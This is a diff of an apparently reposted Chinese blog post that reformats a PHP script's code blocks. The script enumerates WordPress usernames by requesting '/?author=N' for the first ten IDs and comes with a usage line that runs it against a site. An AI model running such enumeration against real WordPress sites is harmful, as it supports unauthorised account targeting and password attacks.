@@ -16,15 +16,19 @@ tags:
 默认获取前10个用户，可自行修改。
 
 使用方法：
-<pre>php wordpress.php http://www.test.com</pre>
 
-<pre class="lang:php decode:true " >&lt;?php
+```
+php wordpress.php http://www.test.com
+```
+
+```
+<?php
 
 set_time_limit(0); 
 $domain = $argv[1];
 
 //获取用户名
-for ($i=1; $i &lt;= 10; $i++) {
+for ($i=1; $i <= 10; $i++) {
 
     $url = $domain."/?author=".$i;
     $response = httprequest($url,0);
@@ -99,6 +103,7 @@ function httprequest($url,$post){
         return $output;
     }
 }
-?&gt;</pre> 
+?>
+```
 
 原文：http://drops.wooyun.org/tools/601
